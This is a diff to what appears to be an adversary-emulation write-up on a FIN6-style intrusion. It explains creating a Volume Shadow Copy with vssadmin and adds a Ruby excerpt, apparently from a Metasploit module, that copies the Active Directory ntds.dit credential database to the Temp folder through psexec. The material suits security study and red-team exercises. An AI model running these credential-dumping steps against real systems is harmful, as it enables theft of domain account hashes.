@@ -375,6 +375,21 @@ vssadmin create shadow /For=%SYSTEMDRIVE%
 
 This command will generate Volume Shadow Copy on the Systemn Drive. A Volume Shadow Copy is a snapshot of a set of files, which can be accessed to copy files even when the originals are currently being used by Windows.
 
+Going back to the source code of this module, we access and make a copy of the NTDS.dit since we have the Shadow Copy Name:
+
+```rb
+  # Copy ntds.dit from the Volume Shadow copy to the Windows Temp directory on the target host
+  def copy_ntds(vscpath, text)
+    begin
+      ntdspath = vscpath.to_s + "\\" + datastore['WINPATH'] + "\\NTDS\\ntds.dit"
+      command = "%COMSPEC% /C copy /Y \"#{ntdspath}\" %WINDIR%\\Temp\\ntds"
+      run = psexec(command)
+      if !check_ntds(text)
+        return false
+      end
+      return true
+```
+
 FIN6
 
 ## Step 4 - Collection and Exfiltration
